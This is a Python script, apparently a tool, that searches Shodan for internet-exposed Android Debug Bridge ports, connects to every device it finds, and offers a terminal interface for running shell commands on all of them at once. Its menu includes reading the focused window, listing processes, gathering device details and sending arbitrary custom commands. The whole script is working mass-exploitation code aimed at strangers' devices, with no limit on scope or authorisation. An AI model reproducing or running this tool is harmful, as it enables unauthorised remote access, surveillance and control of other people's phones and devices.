#!/usr/bin/env python3
import shodan
import socket
import threading
import time
from queue import Queue
from pyadb import ADB
import curses
import json
from datetime import datetime

# ========== CONFIGURATION ==========
SHODAN_API_KEY = 'YOUR_SHODAN_API_KEY_HERE'  # REPLACE THIS!
SHODAN_QUERY = 'product:adb'
# ===================================

class DeviceManager:
    def __init__(self):
        self.adb = ADB()
        self.connected_devices = {}  # Key: IP:Port, Value: {'status': '', 'last_output': ''}
        self.devices_lock = threading.Lock()
        self.message_queue = Queue()  # Thread-safe queue for status updates

    def search_shodan(self):
        """Search Shodan for ADB devices and return a list of targets."""
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            self.message_queue.put(("INFO", f"Searching Shodan for '{SHODAN_QUERY}'..."))
            results = api.search(SHODAN_QUERY)
            targets = []
            for result in results['matches']:
                ip_str = result['ip_str']
                port = result['port']
                target = f"{ip_str}:{port}"
                targets.append(target)
                self.message_queue.put(("FOUND", f"Found potential target: {target}"))
            return targets
        except shodan.APIError as e:
            self.message_queue.put(("ERROR", f"Shodan API Error: {e}"))
            return []
        except Exception as e:
            self.message_queue.put(("ERROR", f"Error during Shodan search: {e}"))
            return []

    def connect_to_device(self, target):
        """Attempt to connect to an ADB device on a given target (IP:PORT)."""
        try:
            ip, port = target.split(':')
            # Check if device is already in list and connected
            with self.devices_lock:
                if target in self.connected_devices and self.connected_devices[target]['status'] == 'CONNECTED':
                    return

            self.message_queue.put(("ATTEMPT", f"Attempting to connect to {target}"))
            
            # Use pyadb to connect
            result = self.adb.run_cmd(f"connect {target}")
            time.sleep(2)  # Give it a moment to establish

            # Check connection status
            devices_output = self.adb.run_cmd("devices")
            if target in devices_output:
                with self.devices_lock:
                    self.connected_devices[target] = {'status': 'CONNECTED', 'last_output': ''}
                self.message_queue.put(("SUCCESS", f"Successfully connected to {target}"))
            else:
                with self.devices_lock:
                    self.connected_devices[target] = {'status': f'FAILED: {result}', 'last_output': ''}
                self.message_queue.put(("ERROR", f"Failed to connect to {target}: {result}"))

        except Exception as e:
            with self.devices_lock:
                self.connected_devices[target] = {'status': f'ERROR: {str(e)}', 'last_output': ''}
            self.message_queue.put(("ERROR", f"Exception connecting to {target}: {e}"))

    def run_command_all_devices(self, command):
        """Run a shell command on all connected devices and store the output."""
        self.message_queue.put(("COMMAND", f"Executing on all devices: {command}"))
        with self.devices_lock:
            targets = list(self.connected_devices.keys())
        
        for target in targets:
            try:
                # Use -s for specific device
                full_cmd = f"-s {target} shell {command}"
                output = self.adb.run_cmd(full_cmd)
                with self.devices_lock:
                    if target in self.connected_devices:
                        self.connected_devices[target]['last_output'] = output
                self.message_queue.put(("OUTPUT", f"Output from {target}:\n{output}"))
            except Exception as e:
                with self.devices_lock:
                    if target in self.connected_devices:
                        self.connected_devices[target]['last_output'] = f"Command Error: {e}"
                self.message_queue.put(("ERROR", f"Error running command on {target}: {e}"))

def main(stdscr):
    # Initialize curses
    curses.curs_set(0)  # Hide the cursor
    stdscr.nodelay(1)   # Non-blocking getch
    stdscr.timeout(100) # Refresh every 100ms

    # Initialize device manager
    dm = DeviceManager()

    # Main UI state
    current_selection = 0
    command_input = ""
    input_mode = False
    status_messages = []
    menu_options = [
        "1. Fetch Screen Text (dumpsys window)",
        "2. List Running Processes (ps)",
        "3. Get Device Info (getprop)",
        "4. Custom Command"
    ]

    # Start Shodan search and connection attempts in a background thread
    def search_and_connect():
        targets = dm.search_shodan()
        for target in targets:
            dm.connect_to_device(target)
        dm.message_queue.put(("INFO", "Initial scan complete."))

    scanner_thread = threading.Thread(target=search_and_connect, daemon=True)
    scanner_thread.start()

    # Main UI loop
    while True:
        stdscr.clear()
        height, width = stdscr.getmaxyx()

        # --- Title Bar ---
        stdscr.addstr(0, 0, "ADB Device Commander via Shodan", curses.A_REVERSE)
        stdscr.clrtoeol()

        # --- Status / Message Log ---
        msg_y = height - 6
        stdscr.addstr(msg_y, 0, "-" * width)
        stdscr.addstr(msg_y+1, 0, "STATUS LOG:")
        for i, msg in enumerate(status_messages[-5:]):  # Show last 5 messages
            if i < 5: # Ensure we don't write beyond screen bounds
                stdscr.addstr(msg_y+2+i, 0, msg[:width-1])

        # --- Connected Devices Panel ---
        dev_y_start = 2
        stdscr.addstr(dev_y_start, 0, "CONNECTED DEVICES:")
        with dm.devices_lock:
            device_count = len(dm.connected_devices)
        stdscr.addstr(dev_y_start, 20, f"Count: {device_count}")
        
        row = dev_y_start + 2
        with dm.devices_lock:
            for i, (target, info) in enumerate(dm.connected_devices.items()):
                if row < height - 8: # Don't write over the status bar
                    status = info['status']
                prefix = "> " if i == current_selection else "  "
                stdscr.addstr(row, 0, f"{prefix}{target} - {status}"[:width-1])
                row += 1

        # --- Command Menu ---
        menu_y_start = dev_y_start + 2 + device_count + 2 if device_count > 0 else dev_y_start + 4
        if menu_y_start < height - 8:
            stdscr.addstr(menu_y_start, 0, "COMMANDS:")
            for i, option in enumerate(menu_options):
                y_pos = menu_y_start + 1 + i
                if y_pos < height - 1:
                    stdscr.addstr(y_pos, 4, option)

        # --- Input Box ---
        if input_mode:
            stdscr.addstr(height-2, 0, "Enter Custom Command: " + command_input, curses.A_REVERSE)
            stdscr.clrtoeol()
        else:
            stdscr.addstr(height-2, 0, "Press 'c' for custom command, 'r' to rescan, 'q' to quit")
            stdscr.clrtoeol()

        # --- Process user input ---
        try:
            key = stdscr.getch()
            if key != -1: # A key was pressed
                if input_mode:
                    if key == 10: # Enter key
                        input_mode = False
                        if command_input.strip():
                            # Execute the custom command on ALL devices
                            cmd_thread = threading.Thread(target=dm.run_command_all_devices, args=(command_input.strip(),), daemon=True)
                            cmd_thread.start()
                        command_input = ""
                    elif key == 27: # ESC key
                        input_mode = False
                        command_input = ""
                    elif key == curses.KEY_BACKSPACE or key == 127:
                        command_input = command_input[:-1]
                    else:
                        # Only add printable characters
                        if 32 <= key <= 126:
                            command_input += chr(key)
                else:
                    if key == ord('q'):
                        break
                    elif key == ord('r'):
                        # Rescan in background
                        rescan_thread = threading.Thread(target=search_and_connect, daemon=True)
                        rescan_thread.start()
                    elif key == ord('c'):
                        input_mode = True
                        command_input = ""
                    elif key == ord('1'):
                        dm.run_command_all_devices("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'")
                    elif key == ord('2'):
                        dm.run_command_all_devices("ps")
                    elif key == ord('3'):
                        dm.run_command_all_devices("getprop ro.product.model && getprop ro.build.version.release")
        except curses.error:
            pass

        # --- Process messages from threads ---
        while not dm.message_queue.empty():
            msg_type, msg_text = dm.message_queue.get_nowait()
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_msg = f"[{timestamp}] {msg_text}"
            status_messages.append(log_msg)

        # Refresh the screen
        stdscr.refresh()
        time.sleep(0.1) # Small delay to prevent high CPU usage

if __name__ == "__main__":
    try:
        curses.wrapper(main)
    except KeyboardInterrupt:
        print("\nExiting...")
